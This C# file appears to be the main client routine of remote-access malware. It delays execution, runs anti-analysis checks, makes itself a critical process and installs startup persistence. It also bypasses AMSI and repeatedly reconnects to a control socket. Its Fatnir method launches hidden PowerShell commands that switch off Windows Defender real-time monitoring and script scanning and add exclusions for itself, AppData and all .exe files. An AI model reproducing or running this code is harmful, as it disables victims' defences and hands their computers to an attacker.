using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Client.Fafnir;

namespace Client;

public class Program
{
	private static string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static readonly string loggerPath = ApplicationData + "\\winLog.txt";

	public static void Main()
	{
		for (int i = 0; i < Convert.ToInt32(Settings.De_lay); i++)
		{
			Thread.Sleep(1000);
		}
		if (!Settings.InitializeSettings())
		{
			Environment.Exit(0);
		}
		string directoryName = Path.GetDirectoryName(loggerPath);
		if (!Directory.Exists(directoryName))
		{
			Console.WriteLine("Directory created");
			Directory.CreateDirectory(directoryName);
		}
		if (!File.Exists(loggerPath))
		{
			Console.WriteLine("File created");
			File.Create(loggerPath).Close();
		}
		try
		{
			if (Convert.ToBoolean(Settings.An_ti))
			{
				Anti_Analysis.RunAntiAnalysis();
			}
			if (!MutexControl.CreateMutex())
			{
				Environment.Exit(0);
			}
			if (Convert.ToBoolean(Settings.Anti_Process))
			{
				AntiProcess.StartBlock();
			}
			if (Convert.ToBoolean(Settings.BS_OD) && Methods.IsAdmin())
			{
				ProcessCritical.Set();
			}
			if (Convert.ToBoolean(Settings.In_stall))
			{
				NormalStartup.Install();
			}
			Methods.PreventSleep();
			if (Methods.IsAdmin())
			{
				Methods.ClearSetting();
			}
			Amsi.Bypass();
			if (Settings.Exclude.Contains("true"))
			{
				Fatnir();
			}
			if (Settings.OffLog.Contains("true"))
			{
				EnsureLoggerPathExists();
			}
		}
		catch
		{
		}
		while (true)
		{
			try
			{
				if (!ClientSocket.IsConnected)
				{
					ClientSocket.Reconnect();
					ClientSocket.InitializeClient();
				}
			}
			catch
			{
			}
			Thread.Sleep(5000);
		}
	}

	public static void EnsureLoggerPathExists()
	{
		Console.WriteLine("Offline is true");
		ProcessCritical.Run();
	}

	public static void Fatnir()
	{
		Console.WriteLine("Fatnir is true");
		try
		{
			Process.Start(new ProcessStartInfo
			{
				FileName = "cmd",
				Arguments = "/k start /b powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath " + Process.GetCurrentProcess().MainModule.FileName + " & exit",
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				ErrorDialog = false
			});
			Process.Start(new ProcessStartInfo
			{
				FileName = "cmd",
				Arguments = "/k start /b powershell.exe Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && powershell Set-MpPreference -SubmitSamplesConsent 2 & powershell.exe -inputformat none -outputformat none -NonInteractive -Command \"Add-MpPreference -ExclusionPath %USERPROFILE%\\AppData\" & powershell.exe -inputformat none -outputformat none -NonInteractive -Command \"Add-MpPreference -ExclusionPath %USERPROFILE%\\Local\" & powershell.exe -command \"Set-MpPreference -ExclusionExtension '.exe'\" & exit",
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				ErrorDialog = false
			});
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error excluding current process from Windows Defender: " + ex.Message);
		}
	}
}
